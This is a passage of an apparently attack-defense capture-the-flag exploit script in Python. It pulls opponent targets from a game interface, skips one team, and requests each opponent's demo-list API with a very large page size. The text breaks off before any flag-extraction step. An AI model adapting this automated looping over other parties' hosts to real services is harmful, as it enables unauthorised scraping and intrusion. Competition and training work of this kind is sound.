...
def main():
  t = Team("http://teaminterface.myctf.world/", "zeroone")
  targets = t.get_targets(10002)
  print(targets)
  for target in targets:
    if target['team_name'] == "UET.binary":
        continue
    flag_id = b64e(target["flag_id"].encode())
    IP = target['hostname']
    PORT = 20002
    with requests.get(f'http://{IP}:{PORT}/api/demo/list?page_size=10000&page_num=0') as r:
        demos = r.json()['demos']
        for demo in demos:
